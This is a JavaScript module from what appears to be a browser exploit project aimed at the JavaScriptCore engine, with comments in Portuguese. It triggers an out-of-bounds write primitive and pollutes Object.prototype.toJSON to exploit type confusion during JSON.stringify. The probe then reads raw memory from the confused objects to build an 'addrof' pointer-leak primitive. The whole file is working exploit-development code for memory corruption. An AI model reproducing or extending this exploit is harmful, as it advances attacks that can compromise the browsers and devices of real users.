// js/script3/testArrayBufferVictimCrash.mjs (v74a_FixConstError)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs'; 

// Corrigido o nome do módulo para v74a
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE = "OriginalHeisenbug_TypedArrayAddrof_v74a_FixConstError";

// Variáveis globais ao módulo
let captured_fuzz_reads_for_AB_v74a = null;
let captured_fuzz_reads_for_DV_v74a = null;

let leak_target_buffer_v74a = null;
let leak_target_dataview_v74a = null;
let victim_typed_array_ref_v74a = null; 
let first_call_details_object_ref_v74a = null; 
let probe_call_count_v74a = 0;
let all_probe_interaction_details_v74a = [];


const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C; 
const OOB_WRITE_VALUE = 0xFFFFFFFF; 
const PROBE_CALL_LIMIT_V74A = 10; 
const FUZZ_READ_OFFSETS_V74A = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30]; 

// Linha 35 corrigida e comentada, pois JSObject_Simple_STRUCTURE_ID é null no config.
// const TARGET_JSOBJECT_STRUCTURE_ID_V74A = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID;


function toJSON_TA_Probe_CorruptTargetInProbe_v74a() { // Renomeado para v74a
    probe_call_count_v74a++;
    const call_num = probe_call_count_v74a;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE, // Atualizado
        this_type: Object.prototype.toString.call(this),
        this_is_victim_typed_array: (this === victim_typed_array_ref_v74a),
        this_is_C1_details: (this === first_call_details_object_ref_v74a && first_call_details_object_ref_v74a !== null),
        this_is_leak_target_AB: (this === leak_target_buffer_v74a && leak_target_buffer_v74a !== null),
        this_is_leak_target_DV: (this === leak_target_dataview_v74a && leak_target_dataview_v74a !== null),
        corruption_attempt_status: null,
        fuzz_capture_status: null,
        error_in_probe: null
    };
    logS3(`[PROBE_V74a] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictimTA? ${current_call_details.this_is_victim_typed_array}. IsC1? ${current_call_details.this_is_C1_details}. IsLeakAB? ${current_call_details.this_is_leak_target_AB}. IsLeakDV? ${current_call_details.this_is_leak_target_DV}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V74A) { all_probe_interaction_details_v74a.push({...current_call_details}); return { recursion_stopped_v74a: true }; }

        if (call_num === 1 && current_call_details.this_is_victim_typed_array) {
            logS3(`[PROBE_V74a] Call #${call_num}: 'this' is victim_typed_array. Creating C1_details WITH PAYLOADS.`, "info");
            first_call_details_object_ref_v74a = { 
                call_number_when_created: call_num, 
                payload_AB: leak_target_buffer_v74a,
                payload_DV: leak_target_dataview_v74a
            };
            all_probe_interaction_details_v74a.push({...current_call_details}); 
            return first_call_details_object_ref_v74a; 
        } 
        else if (current_call_details.this_is_leak_target_AB || current_call_details.this_is_leak_target_DV) {
            const target_name = current_call_details.this_is_leak_target_AB ? "ArrayBuffer_LeakTarget" : "DataView_LeakTarget";
            logS3(`[PROBE_V74a] Call #${call_num}: 'this' IS THE ${target_name}! Original type: ${current_call_details.this_type}`, "critical");

            if (Object.prototype.toString.call(this) === '[object Object]') { 
                 logS3(`[PROBE_V74a]   !!!! ${target_name} ('this') is ALREADY [object Object] in Call #${call_num} !!!!`, "vuln");
                 current_call_details.corruption_attempt_status = `${target_name} was already [object Object].`;
                 try {
                    // Se TARGET_JSOBJECT_STRUCTURE_ID_V74A fosse válido, poderíamos tentar:
                    // this[JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET / seu_tamanho_aqui??] = TARGET_JSOBJECT_STRUCTURE_ID_V74A
                    // Por enquanto, apenas escritas de teste:
                    this[0] = victim_typed_array_ref_v74a; // Tentar vazar a própria vítima
                    this[1] = leak_target_buffer_v74a;   // Tentar vazar o buffer alvo
                    logS3(`[PROBE_V74a]    Attempted to write victim/buffer to props 0,1 of confused ${target_name}.`, "info");
                 } catch(e_direct_write) {
                    logS3(`[PROBE_V74a]    Error writing props to confused ${target_name}: ${e_direct_write.message}`, "warn");
                    current_call_details.corruption_attempt_status += ` DirectWriteErr: ${e_direct_write.message}`;
                 }
            } else {
                current_call_details.corruption_attempt_status = `${target_name} ('this') type is ${current_call_details.this_type}, no direct corruption attempted.`;
            }

            let fuzzed_reads = [];
            try {
                let view_on_this = new DataView(this instanceof ArrayBuffer ? this : this.buffer); 
                for (const offset of FUZZ_READ_OFFSETS_V74A) {
                    let low=0,high=0,ptr_str="N/A",dbl=NaN,err_msg=null; if(view_on_this.byteLength<(offset+8)){err_msg="OOB";}else{low=view_on_this.getUint32(offset,true);high=view_on_this.getUint32(offset+4,true);ptr_str=new AdvancedInt64(low,high).toString(true);let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high;dbl=(new Float64Array(tb))[0];} fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg});
                }
                current_call_details.fuzz_capture_status = `${target_name} Fuzz captured ${fuzzed_reads.length} reads.`;
                if (current_call_details.this_is_leak_target_AB) captured_fuzz_reads_for_AB_v74a = fuzzed_reads;
                else if (current_call_details.this_is_leak_target_DV) captured_fuzz_reads_for_DV_v74a = fuzzed_reads;
                logS3(`[PROBE_V74a]   ${current_call_details.fuzz_capture_status} (First read: ${fuzzed_reads[0]?.int64 || 'N/A'})`, "vuln");
            } catch (e) { current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + ` FuzzReadErr: ${e.message};`; }
            
            all_probe_interaction_details_v74a.push({...current_call_details});
            return { marker_fuzz_done_v74a: true, target: target_name, call_num_processed: call_num };
        }
        else if (current_call_details.this_is_C1 && current_call_details.this_type === '[object Object]') {
            logS3(`[PROBE_V74a] Call #${call_num}: 'this' is C1_details_obj and is [object Object] (confused). Returning 'this'.`, "warn");
            all_probe_interaction_details_v74a.push({...current_call_details});
            return this;
        }
    } catch (e_probe_outer) { current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + ` OuterProbeErr: ${e_probe_outer.message};`; }
    all_probe_interaction_details_v74a.push({...current_call_details});
    return `GenericReturn_Call${call_num}_Type${current_call_details.this_type.replace(/[^a-zA-Z0-9]/g, '')}`;
}


export async function executeTypedArrayVictimAddrofTest_CorruptTargetInProbe_FixConstError() { // Renomeado
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE}.triggerAndLog`; // Atualizado
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (CorruptTargetInProbe_FixConstError) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE} Init...`;

    captured_fuzz_reads_for_AB_v74a = null; captured_fuzz_reads_for_DV_v74a = null;
    probe_call_count_v74a = 0; all_probe_interaction_details_v74a = [];
    victim_typed_array_ref_v74a = null; first_call_details_object_ref_v74a = null;
    
    leak_target_buffer_v74a = new ArrayBuffer(0x80);
    leak_target_dataview_v74a = new DataView(new ArrayBuffer(0x80));

    let errorCapturedMain = null;
    let rawStringifyOutput = "N/A", stringifyOutput_parsed = null;
    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer: Default" };
    let addrof_B_result = { success: false, msg: "Addrof DataView: Default" };
    let pollutionApplied = false, originalToJSONDescriptor = null;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write done.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);
        victim_typed_array_ref_v74a = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        new Uint32Array(leak_target_buffer_v74a).fill(0xDEADBEEF);
        for(let i=0; i < leak_target_dataview_v74a.byteLength; i+=4) { if(i+4 <= leak_target_dataview_v74a.byteLength) leak_target_dataview_v74a.setUint32(i, 0xCAFEBABE, true); }
        logS3(`STEP 2: Victim and Leak Target AB/DV created.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_CorruptTargetInProbe_v74a, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v74a);
            logS3(`  JSON.stringify completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try{ stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch(e){ stringifyOutput_parsed = {parse_error: e.message, raw: rawStringifyOutput};}

            logS3("STEP 3: Analyzing fuzz data from side-channels (v74a)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugIndication = false; 

            const process_fuzz_data = (fuzzed_reads_array, target_addrof_result, objTypeName) => {
                 if (fuzzed_reads_array && Array.isArray(fuzzed_reads_array)) {
                    heisenbugIndication = true; 
                    logS3(`  V74a_ANALYSIS: Processing ${fuzzed_reads_array.length} captured fuzz reads for ${objTypeName}.`, "good");
                    let found_ptr = false;
                    for (const read_attempt of fuzzed_reads_array) {
                        if (read_attempt.error) continue;
                        const highVal = parseInt(read_attempt.high, 16);
                        const lowVal = parseInt(read_attempt.low, 16);
                        let isPotentialPtr = false;
                        if ((highVal !== 0 || lowVal !== 0) && (highVal < 0x000F0000) && !isNaN(read_attempt.dbl) ) {
                             if (highVal >= 0x00000008 && highVal < 0x0000000E ) { isPotentialPtr = true;
                             } else if (lowVal > 0x100000 && (lowVal & 0x7) === 0) { isPotentialPtr = true; }
                        }
                        if(isPotentialPtr){
                            target_addrof_result.success = true;
                            target_addrof_result.msg = `V74a SUCCESS (${objTypeName} Fuzz): Potential Ptr ${read_attempt.int64} @${read_attempt.offset}`;
                            logS3(`  !!!! V74a POTENTIAL POINTER for ${objTypeName} @${read_attempt.offset}: ${read_attempt.int64} (Dbl: ${read_attempt.dbl}) !!!!`, "vuln");
                            found_ptr = true; break; 
                        }
                    }
                    if(!found_ptr){ target_addrof_result.msg = `V74a Fuzz for ${objTypeName}: No clear pointer. First read: ${fuzzed_reads_array[0]?.int64 || 'N/A'}`; }
                } else if (!target_addrof_result.success) { target_addrof_result.msg = `V74a No fuzz data in side-channel for ${objTypeName}.`; }
            };

            process_fuzz_data(captured_fuzz_reads_for_AB_v74a, addrof_A_result, "ArrayBufferTarget");
            process_fuzz_data(captured_fuzz_reads_for_DV_v74a, addrof_B_result, "DataViewTarget");
            
            if(!heisenbugIndication && first_call_details_object_ref_v74a){ const c1 = first_call_details_object_ref_v74a; if(c1.payload_AB || c1.payload_DV) heisenbugIndication = true;}

            if(addrof_A_result.success||addrof_B_result.success){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE}: Addr SUCCESS!`;}
            else if(heisenbugIndication){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE}: Target Reached, Addr Fail`;}
            else{document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE}: No Target?`;}

        } catch (e) { errorCapturedMain = e; document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE}: InnerCatch ERR`;
        } finally { if (pollutionApplied) { if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];} }
    } catch (e) { errorCapturedMain = e; document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE}: OuterCatch ERR`; }
    finally {
        let final_probe_details_snapshot_for_return = null;
        if (all_probe_interaction_details_v74a && Array.isArray(all_probe_interaction_details_v74a) && all_probe_interaction_details_v74a.length > 0) {
           try { final_probe_details_snapshot_for_return = JSON.parse(JSON.stringify(all_probe_interaction_details_v74a[all_probe_interaction_details_v74a.length-1])); } catch(e) {final_probe_details_snapshot_for_return = {serialization_error: e.message};}
        }
        
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v74a}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof AB Target: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof DV Target: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v74a = null; all_probe_interaction_details_v74a = []; probe_call_count_v74a = 0; first_call_details_object_ref_v74a = null; leak_target_buffer_v74a = null; leak_target_dataview_v74a = null; captured_fuzz_reads_for_AB_v74a = null; captured_fuzz_reads_for_DV_v74a = null;
   
        return {
            errorCapturedMain: errorCapturedMain, stringifyResult: stringifyOutput_parsed, 
            toJSON_details: final_probe_details_snapshot_for_return,
            all_probe_calls_for_analysis: all_probe_interaction_details_v74a.map(d=>({...d})), 
            total_probe_calls: probe_call_count_v74a, // será 0 devido ao reset, mas o log acima tem o valor
            addrof_A_result: addrof_A_result, addrof_B_result: addrof_B_result
        };
    }
};
